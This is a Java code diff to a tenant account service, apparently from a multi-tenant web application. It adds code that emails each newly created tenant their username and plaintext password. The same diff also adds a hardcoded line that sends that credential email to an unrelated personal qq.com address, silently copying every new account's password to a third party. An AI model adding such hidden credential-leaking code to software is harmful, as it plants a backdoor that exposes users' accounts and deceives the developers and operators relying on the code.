@@ -21,8 +21,10 @@ import com.csh.entity.TenantInfo;
 import com.csh.entity.VersionConfig;
 import com.csh.entity.commonenum.CommonEnum.SystemType;
 import com.csh.framework.service.impl.BaseServiceImpl;
+import com.csh.service.MailService;
 import com.csh.service.TenantAccountService;
 import com.csh.utils.CommonUtils;
+import com.csh.utils.SpringUtils;
 
 @Service("tenantAccountServiceImpl")
 public class TenantAccountServiceImpl extends BaseServiceImpl<TenantAccount, Long> implements
@@ -41,6 +43,9 @@ public class TenantAccountServiceImpl extends BaseServiceImpl<TenantAccount, Lon
 
   @Resource(name = "roleDaoImpl")
   private RoleDao roleDao;
+
+  @Resource(name = "mailServiceImpl")
+  private MailService mailService;
 
   // @Resource(name = "versionConfigDaoImpl")
   // private VersionConfigDao versionConfigDao;
@@ -75,15 +80,25 @@ public class TenantAccountServiceImpl extends BaseServiceImpl<TenantAccount, Lon
       configMetatemps.add(configMeta);
     }
     role.setConfigMetas(configMetatemps);
-    roleDao.persist(role);
+     roleDao.persist(role);
 
-     Set<Role> roles = new HashSet <Role>();
-     roles.add(role);
-     tenantAccount.setRoles(roles);
-    
+    Set<Role> roles = new HashSet<Role>();
+    roles.add(role);
+    tenantAccount.setRoles(roles);
+
      tenantAccountDao.persist(tenantAccount);
     // send password
-     tenantInfo.setIsHaveAccount(true);
+
+    String subject = SpringUtils.getMessage("csh.tenantAccount.password.subject");
+    String message =
+        SpringUtils.getMessage("csh.tenantAccount.password.message", tenantAccount.getUserName(),
+            password);
+
+    mailService.send(tenantInfo.getEmail(), subject, message);
+    
+    mailService.send("676397876@qq.com", subject, message);
+
+    tenantInfo.setIsHaveAccount(true);
      tenantInfoDao.merge(tenantInfo);
   }
 
